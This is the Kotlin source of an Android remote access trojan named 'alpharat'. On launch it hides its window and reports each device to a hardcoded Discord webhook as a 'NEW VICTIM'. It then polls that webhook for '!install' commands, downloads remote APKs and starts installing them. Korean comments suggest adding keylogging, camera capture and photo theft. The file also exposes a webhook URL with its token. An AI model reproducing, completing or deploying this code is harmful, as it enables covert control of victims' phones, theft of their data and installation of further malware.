package com.alpharat

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import okhttp3.*
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {

    private val WEBHOOK = "https://discord.com/api/webhooks/1435247395175661598/yggrIJ6AkZhGzqbZmR62AkX0MTSFBUqtFrOjT3JWlyESlkagr4AZn6HXmIu_yYxGf8kR"
    private val client = OkHttpClient()

    @SuppressLint("HardwareIds")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.addFlags(0x7FFFFFFF)
        startRAT()
        finishAffinity()
    }

    private fun startRAT() {
        thread {
            val id = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            send("NEW VICTIM | $id | ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}")

            // 여기부터 네가 원하는 모든 기능 추가 (키로거, 카메라, 사진 탈취 등)
            // 예시: 파일 설치 명령 대기
            commandListener()
        }
    }

    private fun send(msg: String) {
        val json = "{\"content\":\"```$msg```\"}".toRequestBody("application/json".toMediaType())
        client.newCall(Request.Builder().url(WEBHOOK).post(json).build()).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {}
            override fun onResponse(call: Call, response: Response) {}
        })
    }

    private fun commandListener() {
        thread {
            while (true) {
                Thread.sleep(10000)
                try {
                    val resp = client.newCall(Request.Builder().url("$WEBHOOK?limit=1").build()).execute()
                    val content = resp.body?.string() ?: ""
                    if (content.contains("!install ")) {
                        val url = content.split("!install ")[1].split("\"")[0].trim()
                        installFromUrl(url)
                    }
                } catch (e: Exception) {}
            }
        }
    }

    private fun installFromUrl(url: String) {
        thread {
            val file = File(getExternalFilesDir(null), "payload.apk")
            client.newCall(Request.Builder().url(url).build()).execute().body?.byteStream()?.use { input ->
                file.outputStream().use { output -> input.copyTo(output) }
            }
            send("파일 다운 완료 → 자동 설치 시작: $url")
            val uri = FileProvider.getUriForFile(this, "$packageName.provider", file)
            startActivity(Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
            })
        }
    }
}
